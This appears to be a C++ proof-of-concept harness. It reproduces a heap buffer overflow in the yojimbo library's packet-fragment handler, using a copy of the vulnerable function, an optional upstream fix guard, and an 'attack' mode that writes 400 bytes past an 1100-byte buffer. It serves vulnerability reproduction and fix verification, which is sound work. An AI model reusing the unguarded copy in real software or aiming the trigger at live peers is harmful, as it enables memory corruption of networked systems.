// yojimbo2shell — pinned-function harness for CVE-less upstream fix d3d4f33.
//
// The method body below is copied verbatim from
//   source/yojimbo_reliable_ordered_channel.cpp @ 3c6b5e85fe8da778e0ace3526e725844bb7286bf
// lines 663-782 (vulnerable).  The block between YOJIMBO_FIXED_BEGIN/END is the
// exact 13-line guard added by commit d3d4f3398cee5d154d22011ff7099a5d8a87d324
// (fixed source lines 710-722).  Everything above the method is a minimal
// stand-in for yojimbo types; no upstream logic is rewritten.
//
// Modes: attack (fragmentBytes=500, fragmentId=2, 1100-byte buffer), safe
// (fragmentBytes=100).  Build flags:
//   -DYOJIMBO_EXACT_ALLOCATION : malloc(maxBlockSize) so ASan redzones start at
//                               offset 1100 (used by the ASan builds).
//   -DYOJIMBO_FIXED            : compile the upstream pre-copy guard in.
// Plain builds allocate maxBlockSize+512 and fill the tail with 0x5a so the
// chosen "MISHE-OO" bytes can be read at canary[300] after the write.

#include <cassert>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#define yojimbo_assert( x ) assert( x )

enum {
    CHANNEL_ERROR_NONE = 0,
    CHANNEL_ERROR_DESYNC = 1,
    CHANNEL_ERROR_OUT_OF_MEMORY = 2
};

struct Allocator {};
#define YOJIMBO_ALLOCATE( allocator, size ) malloc( size )

struct BlockMessage {
    void AttachBlock( Allocator &, uint8_t *, int ) {}
    void SetId( uint16_t ) {}
};

struct MessageFactory {
    Allocator & GetAllocator() { return allocator; }
    void AcquireMessage( BlockMessage * ) {}
    Allocator allocator;
};

struct MessageReceiveQueueEntry {
    BlockMessage * message;
};

struct MessageReceiveQueue {
    uint16_t GetSequence() const { return 0; }
    int GetIndex( uint16_t ) const { return 0; }
    MessageReceiveQueueEntry * GetAtIndex( int ) const { return NULL; }
    MessageReceiveQueueEntry * Insert( uint16_t ) {
        static MessageReceiveQueueEntry entry;
        return &entry;
    }
};

struct BitArray {
    uint32_t bits;
    BitArray() : bits( 0 ) {}
    void Clear() { bits = 0; }
    bool GetBit( int i ) const { return ( bits >> i ) & 1u; }
    void SetBit( int i ) { bits |= ( 1u << i ); }
};

// Verbatim helper body from include/yojimbo_channel.h @ pinned parent, lines 153-160.
struct ChannelConfig {
    bool disableBlocks;
    int maxBlockSize;
    int blockFragmentSize;
    int GetMaxFragmentsPerBlock() const
    {
        // Round up: a block of maxBlockSize needs ceil(maxBlockSize/blockFragmentSize)
        // fragments. Using floor here under-sizes the send-side fragment buffers when
        // maxBlockSize is not a multiple of blockFragmentSize (see GetFragmentToSend,
        // which counts fragments with ceil).
        return ( maxBlockSize + blockFragmentSize - 1 ) / blockFragmentSize;
    }
};

struct ReceiveBlockData {
    bool active;
    int numFragments;
    int numReceivedFragments;
    uint16_t messageId;
    uint32_t blockSize;
    int messageType;
    BitArray * receivedFragment;
    BlockMessage * blockMessage;
    uint8_t * blockData;
    uint8_t * canary;

    ReceiveBlockData( int maxBlockSize, int /*numFragments*/ )
        : active( false )
        , numFragments( 0 )
        , numReceivedFragments( 0 )
        , messageId( 0 )
        , blockSize( 0 )
        , messageType( 0 )
        , blockMessage( NULL )
        , canary( NULL )
    {
        receivedFragment = new BitArray;
#ifdef YOJIMBO_EXACT_ALLOCATION
        blockData = (uint8_t *) malloc( maxBlockSize );
#else
        blockData = (uint8_t *) malloc( maxBlockSize + 512 );
        canary = blockData + maxBlockSize;
        memset( canary, 0x5a, 512 );
#endif
    }

    ~ReceiveBlockData()
    {
        free( blockData );
        delete receivedFragment;
    }
};

class ReliableOrderedChannel {
public:
    ChannelConfig m_config;
    ReceiveBlockData * m_receiveBlock;
    MessageFactory * m_messageFactory;
    MessageReceiveQueue * m_messageReceiveQueue;
    int m_error;

    ReliableOrderedChannel()
        : m_receiveBlock( NULL )
        , m_messageFactory( NULL )
        , m_messageReceiveQueue( NULL )
        , m_error( CHANNEL_ERROR_NONE )
    {
        m_config.disableBlocks = false;
    }

    void SetErrorLevel( int e ) { m_error = e; }

    // ---- BEGIN VERBATIM PINNED FUNCTION (vulnerable source lines 663-782) ----
    void ProcessPacketFragment( int messageType, 
                                uint16_t messageId, 
                                int numFragments, 
                                uint16_t fragmentId, 
                                const uint8_t * fragmentData, 
                                int fragmentBytes, 
                                BlockMessage * blockMessage )
    {  
        yojimbo_assert( !m_config.disableBlocks );

        if ( fragmentData )
        {
            const uint16_t expectedMessageId = m_messageReceiveQueue->GetSequence();
            if ( messageId != expectedMessageId )
                return;

            // start receiving a new block

            if ( !m_receiveBlock->active )
            {
                yojimbo_assert( numFragments >= 0 );
                yojimbo_assert( numFragments <= m_config.GetMaxFragmentsPerBlock() );

                m_receiveBlock->active = true;
                m_receiveBlock->numFragments = numFragments;
                m_receiveBlock->numReceivedFragments = 0;
                m_receiveBlock->messageId = messageId;
                m_receiveBlock->blockSize = 0;
                m_receiveBlock->receivedFragment->Clear();
            }

            // validate fragment

            if ( fragmentId >= m_receiveBlock->numFragments )
            {
                // The fragment id is out of range.
                SetErrorLevel( CHANNEL_ERROR_DESYNC );
                return;
            }

            if ( numFragments != m_receiveBlock->numFragments )
            {
                // The number of fragments is out of range.
                SetErrorLevel( CHANNEL_ERROR_DESYNC );
                return;
            }

#ifdef YOJIMBO_FIXED
            // ---- YOJIMBO_FIXED_BEGIN: exact guard from fixed source lines 710-722 ----
            // Validate the fragment write against the receive buffer BEFORE copying.
            // blockData is allocated at maxBlockSize bytes, but when maxBlockSize is not a
            // multiple of blockFragmentSize the fragment count rounds up, so the final fragment
            // starts at an offset where a full blockFragmentSize write would run past the buffer.
            // fragmentBytes is attacker-controlled in [1,blockFragmentSize] (see SerializeBlockFragment),
            // so a peer can send an over-long final fragment. Reject anything that wouldn't fit
            // rather than overflowing the heap (the blockSize check below only runs after the copy).
            if ( fragmentId * m_config.blockFragmentSize + fragmentBytes > m_config.maxBlockSize )
            {
                // The fragment would write past the end of the block buffer.
                SetErrorLevel( CHANNEL_ERROR_DESYNC );
                return;
            }
            // ---- YOJIMBO_FIXED_END ----
#endif

            // receive the fragment

            if ( !m_receiveBlock->receivedFragment->GetBit( fragmentId ) )
            {
                m_receiveBlock->receivedFragment->SetBit( fragmentId );

                memcpy( m_receiveBlock->blockData + fragmentId * m_config.blockFragmentSize, fragmentData, fragmentBytes );

                if ( fragmentId == 0 )
                {
                    m_receiveBlock->messageType = messageType;
                }

                if ( fragmentId == m_receiveBlock->numFragments - 1 )
                {
                    m_receiveBlock->blockSize = ( m_receiveBlock->numFragments - 1 ) * m_config.blockFragmentSize + fragmentBytes;

                    if ( m_receiveBlock->blockSize > (uint32_t) m_config.maxBlockSize )
                    {
                        // The block size is outside range
                        SetErrorLevel( CHANNEL_ERROR_DESYNC );
                        return;
                    }
                }

                m_receiveBlock->numReceivedFragments++;

                if ( fragmentId == 0 )
                {
                    // save block message (sent with fragment 0)
                    m_receiveBlock->blockMessage = blockMessage;
                    m_messageFactory->AcquireMessage( m_receiveBlock->blockMessage );
                }

                if ( m_receiveBlock->numReceivedFragments == m_receiveBlock->numFragments )
                {
                    // finished receiving block

                    if ( m_messageReceiveQueue->GetAtIndex( m_messageReceiveQueue->GetIndex( messageId ) ) )
                    {
                        // Did you forget to dequeue messages on the receiver?
                        SetErrorLevel( CHANNEL_ERROR_DESYNC );
                        return;
                    }

                    blockMessage = m_receiveBlock->blockMessage;

                    yojimbo_assert( blockMessage );

                    uint8_t * blockData = (uint8_t*) YOJIMBO_ALLOCATE( m_messageFactory->GetAllocator(), m_receiveBlock->blockSize );

                    if ( !blockData )
                    {
                        // Not enough memory to allocate block data
                        SetErrorLevel( CHANNEL_ERROR_OUT_OF_MEMORY );
                        return;
                    }

                    memcpy( blockData, m_receiveBlock->blockData, m_receiveBlock->blockSize );

                    blockMessage->AttachBlock( m_messageFactory->GetAllocator(), blockData, m_receiveBlock->blockSize );

                    blockMessage->SetId( messageId );

                    MessageReceiveQueueEntry * entry = m_messageReceiveQueue->Insert( messageId );
                    yojimbo_assert( entry );
                    entry->message = blockMessage;
                    m_receiveBlock->active = false;
                    m_receiveBlock->blockMessage = NULL;
                }
            }
        }
    }
    // ---- END VERBATIM PINNED FUNCTION ----
};

int main( int argc, char ** argv )
{
    const char * mode = ( argc > 1 ) ? argv[1] : "attack";
    const int fragmentBytes = ( strcmp( mode, "safe" ) == 0 ) ? 100 : 500;

    ReliableOrderedChannel channel;
    channel.m_config.maxBlockSize = 1100;
    channel.m_config.blockFragmentSize = 500;
    assert( channel.m_config.GetMaxFragmentsPerBlock() == 3 );

    channel.m_receiveBlock = new ReceiveBlockData( channel.m_config.maxBlockSize, 3 );
    channel.m_messageFactory = new MessageFactory;
    channel.m_messageReceiveQueue = new MessageReceiveQueue;
    BlockMessage blockMessage;

    // Attacker-controlled final fragment: 500 bytes, marker at payload offset 400.
    uint8_t fragmentData[500];
    memset( fragmentData, 0x5a, sizeof( fragmentData ) );
    memcpy( fragmentData + 400, "MISHE-OO", 8 );

    channel.ProcessPacketFragment( 0, 0, 3, 2, fragmentData, fragmentBytes, &blockMessage );

    printf( "mode=%s fragmentBytes=%d offset=%d region=%d error=%d\n",
            mode, fragmentBytes, 2 * 500, 1100, channel.m_error );
#ifdef YOJIMBO_EXACT_ALLOCATION
    printf( "allocation=exact\n" );
#else
    printf( "canary0=%02x canary300=%.8s\n",
            channel.m_receiveBlock->canary[0],
            (char *) channel.m_receiveBlock->canary + 300 );
#endif

    delete channel.m_messageFactory;
    delete channel.m_messageReceiveQueue;
    delete channel.m_receiveBlock;
    return 0;
}
